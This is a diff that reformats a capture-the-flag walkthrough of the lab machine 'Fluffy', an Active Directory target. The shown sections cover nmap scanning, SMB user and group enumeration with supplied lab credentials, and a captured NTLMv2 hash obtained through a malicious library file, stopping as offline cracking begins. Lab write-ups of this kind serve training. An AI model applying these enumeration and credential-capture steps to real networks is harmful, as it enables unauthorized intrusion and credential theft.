@@ -1,9 +1,9 @@
-|-----------------------------------------------------------------------|
-| TARGET MACHINE NAME:	       FLUFFY					                          |
-| TARGET MACHINE IP:		       10.10.11.69				                      |
-| TARGET MACHINE ENVIRONMENT:	 WINDOWS / ACTIVE DIRECTORY		            |
-| ATTACK AUTHOR:		           EAGLE-1					                        |
-|-----------------------------------------------------------------------|
+|-----------------------------------------------------------------------
+| TARGET MACHINE NAME: FLUFFY					                          
+| TARGET MACHINE IP: 10.10.11.69				                      
+| TARGET MACHINE ENVIRONMENT: WINDOWS / ACTIVE DIRECTORY		            
+| ATTACK AUTHOR: EAGLE-1					                        
+|-----------------------------------------------------------------------
 SYNOPSIS: The target machine identified as "FLUFFY" is a windows environment that exposes open ports 
 that are consistent with the presence of Active Directory services. The overall result of compromising
 the target domain extends from the exploitation of Active Directory Certificate Services and their
@@ -30,7 +30,7 @@ USERNAME: j.fleischman
 PASSWORD: J0elTHEM4n1990!
 
 -----------------------------------------
-| PHASE ONE:	NMAP ENUMERATION	        |  
+| PHASE ONE:	NMAP ENUMERATION	    
 -----------------------------------------
 Using Nmap, a commonly used open source tool that identifies devices, services and scripts operating on a
 network - we will perform a few scans to obtain as much information as possible using scans ranging from
@@ -49,85 +49,85 @@ so our information is limited. However, we are now aware of all hosts that are a
 are exposing on the network.
 
 -----------------
-| NMAP RESULT	  |
---------------------------------------------------------|
-Nmap scan report for 10.10.11.20			                  |					
-Host is up (0.050s latency).				                    |
-Not shown: 998 closed tcp ports (reset)			            |	
-PORT   STATE SERVICE					                          |
-22/tcp open  ssh					                              |
-80/tcp open  http					                              |
---------------------------------------------------------|
-Nmap scan report for 10.10.11.46			                  |		
-Host is up (0.051s latency).				                    |
-Not shown: 998 closed tcp ports (reset)			            |
-PORT   STATE SERVICE					                          |
-22/tcp open  ssh					                              |
-80/tcp open  http					                              |
---------------------------------------------------------|
-Nmap scan report for 10.10.11.64			                  |
-Host is up (0.051s latency).				                    |
-Not shown: 998 closed tcp ports (reset)			            |
-PORT   STATE SERVICE					                          |
-22/tcp open  ssh					                              |
-80/tcp open  http					                              |
---------------------------------------------------------|
-Nmap scan report for fluffy.htb (10.10.11.69)		        |
-Host is up (0.052s latency).				                    |
-Not shown: 989 filtered tcp ports (no-response)		      |
-PORT     STATE SERVICE					                        |
-53/tcp   open  domain					                          |
-88/tcp   open  kerberos-sec				                      |
-139/tcp  open  netbios-ssn				                      |
-389/tcp  open  ldap					                            |
-445/tcp  open  microsoft-ds				                      |
-464/tcp  open  kpasswd5					                        |
-593/tcp  open  http-rpc-epmap				                    |
-636/tcp  open  ldapssl					                        |
-3268/tcp open  globalcatLDAP				                    |
-3269/tcp open  globalcatLDAPssl				                  |
-5985/tcp open  wsman					                          |
---------------------------------------------------------|
-Nmap scan report for 10.10.11.72			                  |
-Host is up (0.052s latency).				                    |
-Not shown: 987 filtered tcp ports (no-response)		      |
-PORT     STATE SERVICE					                        |
-53/tcp   open  domain					                          |
-80/tcp   open  http					                            |
-88/tcp   open  kerberos-sec				                      |
-135/tcp  open  msrpc					                          |
-139/tcp  open  netbios-ssn				                      |
-389/tcp  open  ldap					                            |
-445/tcp  open  microsoft-ds				                      |
-464/tcp  open  kpasswd5					                        |
-593/tcp  open  http-rpc-epmap				                    |
-636/tcp  open  ldapssl					                        |
-3268/tcp open  globalcatLDAP				                    |
-3269/tcp open  globalcatLDAPssl				                  |
-5985/tcp open  wsman					                          |
---------------------------------------------------------|
-Nmap scan report for 10.10.11.154			                  |
-Host is up (0.050s latency).				                    |
-Not shown: 998 closed tcp ports (reset)			            |
-PORT   STATE SERVICE					                          |
-22/tcp open  ssh					                              |
-80/tcp open  http					                              |
---------------------------------------------------------|
-Nmap scan report for 10.10.11.189			                  |
-Host is up (0.050s latency).				                    |
-Not shown: 998 closed tcp ports (reset)			            |
-PORT   STATE SERVICE					                          |
-22/tcp open  ssh					                              |
-80/tcp open  http					                              |
---------------------------------------------------------|
-Nmap scan report for 10.10.11.194			                  |
-Host is up (0.050s latency).				                    |
-Not shown: 997 closed tcp ports (reset)			            |
-PORT     STATE SERVICE					                        |
-22/tcp   open  ssh					                            |
-80/tcp   open  http					                            |
-9091/tcp open  xmltec-xmlmail				                    |
---------------------------------------------------------|
+| NMAP RESULT	 
+--------------------------------------------------------
+Nmap scan report for 10.10.11.20			                  			
+Host is up (0.050s latency).				                    
+Not shown: 998 closed tcp ports (reset)			            
+PORT   STATE SERVICE					                          
+22/tcp open  ssh					                              
+80/tcp open  http					                              
+--------------------------------------------------------
+Nmap scan report for 10.10.11.46			                  
+Host is up (0.051s latency).				                    
+Not shown: 998 closed tcp ports (reset)			            
+PORT   STATE SERVICE					                          
+22/tcp open  ssh					                              
+80/tcp open  http					                              
+--------------------------------------------------------
+Nmap scan report for 10.10.11.64			                  
+Host is up (0.051s latency).				                    
+Not shown: 998 closed tcp ports (reset)			            
+PORT   STATE SERVICE					                          
+22/tcp open  ssh					                              
+80/tcp open  http					                              
+--------------------------------------------------------
+Nmap scan report for fluffy.htb (10.10.11.69)		        
+Host is up (0.052s latency).				                    
+Not shown: 989 filtered tcp ports (no-response)		      
+PORT     STATE SERVICE					                        
+53/tcp   open  domain					                          
+88/tcp   open  kerberos-sec				                      
+139/tcp  open  netbios-ssn				                      
+389/tcp  open  ldap					                            
+445/tcp  open  microsoft-ds				                      
+464/tcp  open  kpasswd5					                        
+593/tcp  open  http-rpc-epmap				                    
+636/tcp  open  ldapssl					                       
+3268/tcp open  globalcatLDAP				                    
+3269/tcp open  globalcatLDAPssl				                  
+5985/tcp open  wsman					                          
+--------------------------------------------------------
+Nmap scan report for 10.10.11.72			                  
+Host is up (0.052s latency).				                    
+Not shown: 987 filtered tcp ports (no-response)		      
+PORT     STATE SERVICE					                        
+53/tcp   open  domain					                          
+80/tcp   open  http					                            
+88/tcp   open  kerberos-sec				                      
+135/tcp  open  msrpc					                          
+139/tcp  open  netbios-ssn				                      
+389/tcp  open  ldap					                            
+445/tcp  open  microsoft-ds				                     
+464/tcp  open  kpasswd5					                        
+593/tcp  open  http-rpc-epmap				                    
+636/tcp  open  ldapssl					                        
+3268/tcp open  globalcatLDAP				                    
+3269/tcp open  globalcatLDAPssl				                  
+5985/tcp open  wsman					                          
+--------------------------------------------------------
+Nmap scan report for 10.10.11.154			                  
+Host is up (0.050s latency).				                    
+Not shown: 998 closed tcp ports (reset)			            
+PORT   STATE SERVICE					                          
+22/tcp open  ssh					                              
+80/tcp open  http					                              
+--------------------------------------------------------
+Nmap scan report for 10.10.11.189			                  
+Host is up (0.050s latency).				                    
+Not shown: 998 closed tcp ports (reset)			            
+PORT   STATE SERVICE					                          
+22/tcp open  ssh					                              
+80/tcp open  http					                              
+--------------------------------------------------------
+Nmap scan report for 10.10.11.194			                  
+Host is up (0.050s latency).				                    
+Not shown: 997 closed tcp ports (reset)			            
+PORT     STATE SERVICE					                        
+22/tcp   open  ssh					                            
+80/tcp   open  http					                            
+9091/tcp open  xmltec-xmlmail				                    
+--------------------------------------------------------
 Based on the results provided - especially at addresses: 10.10.11.69 and 10.10.11.72, we can make positive
 assertations that the target is a windows active directory environment. We know this due to the following open
 ports:
@@ -147,9 +147,9 @@ enumeration successful.
 COMMAND: # nmap 10.10.11.69 -sCV -A -O -p- --min-rate=10000 --stats-every=10s -oX FLUFFY-NMAP.xml
 MEANING: # [TOOL][IP ADDRESS][SERVICE/SCRIPT SCAN][AGGRESSIVE SCAN][OS SCAN][PORTS 0-65535][PACKETS PER SECOND][VERBOSE SCAN STATS][XML FILE OUTPUT]
 
-|---------------|
-| NMAP RESULT	  |
-|---------------|---------------------------------------------------------------------------------------------------------------
+|---------------
+| NMAP RESULT	 
+|------------------------------------------------------------------------------------------------------------------------------
 Nmap scan report for fluffy.htb (10.10.11.69)											
 Host is up (0.052s latency).													
 Not shown: 65516 filtered tcp ports (no-response)										
@@ -224,8 +224,8 @@ operating on the network. In addition to further confirming the presence of Acti
 name and the address of the domain controller itself.
 
 ---------------------------------------------------------
-|	DOMAIN NAME:		FLUFFY.HTB/FLUFFY.HTB0	              |
-|	DOMAIN CONTROLLER:	DC01.FLUFFY.HTB		                |
+|	DOMAIN NAME:		FLUFFY.HTB/FLUFFY.HTB0	              
+|	DOMAIN CONTROLLER:	DC01.FLUFFY.HTB		                
 ---------------------------------------------------------
 PERSONAL NOTE: Due to the way that differing tools resolve the common names of domains and their associated controllers - on top of
 just generally being unsure if there is a typo/idiosyncrasy in the results of the Nmap scan, we will append the address FLUFFY.HTB,
@@ -235,7 +235,7 @@ At this point, we have obtained more than enough information to continue on with
 will begin to enumerate the specific services that can potentially give us our initial foothold.
 
 -------------------------------------------------
-| PHASE TWO:	SMB ENUMERATION /W NETEXEC	      |
+| PHASE TWO:	SMB ENUMERATION /W NETEXEC	      
 -------------------------------------------------
 To begin our deeper enumeration of the target environment, we will begin targeting port 445 - also known as Microsoft-DS or Server Message
 Block (SMB). We will use a tool known as NetExec to enumerate not just SMB, but the many services that are present within the target domain.
@@ -259,22 +259,22 @@ COMMAND: # nxc smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --users
 MEANING: # [TOOL][SMB PROTOCOL][IP ADDRESS][-U USERNAME][-P USER PASSWORD][ENUMERATION MODULE]
 
 ----------------------------------------
-| NETEXEC SMB USERS ENUMERATION RESULT |
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)		            |
+| NETEXEC SMB USERS ENUMERATION RESULT 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)		            
 SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!										                                                      |
-SMB         10.10.11.69     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-						                                  | 
-SMB         10.10.11.69     445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain	  |
-SMB         10.10.11.69     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain	|
-SMB         10.10.11.69     445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account			              |			
-SMB         10.10.11.69     445    DC01             ca_svc                        2025-04-17 16:07:50 0									                                                |
-SMB         10.10.11.69     445    DC01             ldap_svc                      2025-04-17 16:17:00 0									                                                |
-SMB         10.10.11.69     445    DC01             p.agila                       2025-04-18 14:37:08 0									                                                |
-SMB         10.10.11.69     445    DC01             winrm_svc                     2025-05-18 00:51:16 0									                                                |
-SMB         10.10.11.69     445    DC01             j.coffey                      2025-04-19 12:09:55 0									                                                |
-SMB         10.10.11.69     445    DC01             j.fleischman                  2025-05-16 14:46:55 0									                                                |
+SMB         10.10.11.69     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-						                                  
+SMB         10.10.11.69     445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain	  
+SMB         10.10.11.69     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain	
+SMB         10.10.11.69     445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account			              	
+SMB         10.10.11.69     445    DC01             ca_svc                        2025-04-17 16:07:50 0									                                                
+SMB         10.10.11.69     445    DC01             ldap_svc                      2025-04-17 16:17:00 0									                                                
+SMB         10.10.11.69     445    DC01             p.agila                       2025-04-18 14:37:08 0									                                                
+SMB         10.10.11.69     445    DC01             winrm_svc                     2025-05-18 00:51:16 0									                                                
+SMB         10.10.11.69     445    DC01             j.coffey                      2025-04-19 12:09:55 0									                                                
+SMB         10.10.11.69     445    DC01             j.fleischman                  2025-05-16 14:46:55 0									                                                
 SMB         10.10.11.69     445    DC01             [*] Enumerated 9 local users: FLUFFY										                                                            |
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 In the result above, our first scan initially shows that our credentials are valid in their authentication
 against the domain and provides us with results pertaining to all users and accounts present on the domain.
@@ -293,7 +293,7 @@ MEANING: # [TOOL][SMB PROTOCOL][IP ADDRESS][-U USERNAME][-P USER PASSWORD][ENUME
 ----------------------------------------------------------------------------------------------------------------------------------------------------------------
 SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)	
 SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!									
-SMB         10.10.11.69     445    DC01             [*] Enumerating with SAMRPC protocol									|
+SMB         10.10.11.69     445    DC01             [*] Enumerating with SAMRPC protocol									
 SMB         10.10.11.69     445    DC01             [+] Enumerated local groups											
 SMB         10.10.11.69     445    DC01             549 - Server Operators											
 SMB         10.10.11.69     445    DC01             548 - Account Operators											
@@ -532,14 +532,14 @@ the assumption that it contained a legitimate .library-ms file. For additional u
 
 ---------------
 | NTLMv2 HASH |
---------------------------------------------------------------------------------------------------------------------------------|
-p.agila::FLUFFY:59d841fc40d43fee:BF41C127EA316C57FE7B1EE90013F831:010100000000000080EC475799DCDB01140A8CCA245B4BA4000000000	    |
-2000800340045005000470001001E00570049004E002D0046004F0031005800330052005800430055004900460004003400570049004E002D0046004F00	    |
-3100580033005200580043005500490046002E0034004500500047002E004C004F00430041004C000300140034004500500047002E004C004F004300410	    |
-04C000500140034004500500047002E004C004F00430041004C000700080080EC475799DCDB010600040002000000080030003000000000000000010000	    |
-000020000044E048DFCADF50A76735BFCE6AC7935E0E7F5C012D91841B83C631B6DC31A3C30A00100000000000000000000000000000000000090020006	    |
-3006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000							                                    |
---------------------------------------------------------------------------------------------------------------------------------|
+--------------------------------------------------------------------------------------------------------------------------------
+p.agila::FLUFFY:59d841fc40d43fee:BF41C127EA316C57FE7B1EE90013F831:010100000000000080EC475799DCDB01140A8CCA245B4BA4000000000	    
+2000800340045005000470001001E00570049004E002D0046004F0031005800330052005800430055004900460004003400570049004E002D0046004F00	    
+3100580033005200580043005500490046002E0034004500500047002E004C004F00430041004C000300140034004500500047002E004C004F004300410	    
+04C000500140034004500500047002E004C004F00430041004C000700080080EC475799DCDB010600040002000000080030003000000000000000010000	    
+000020000044E048DFCADF50A76735BFCE6AC7935E0E7F5C012D91841B83C631B6DC31A3C30A00100000000000000000000000000000000000090020006	    
+3006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000							                                    
+--------------------------------------------------------------------------------------------------------------------------------
 
 Now that we have this hash, we can crack it offline utilizing tools like hashcat, hydra, john the ripper, etc. For this example, we will use
 hashcat, a very robust bruteforce / hash cracking tool. We will utilize an extensive wordlist called 'rockyou.txt' to see if we can match
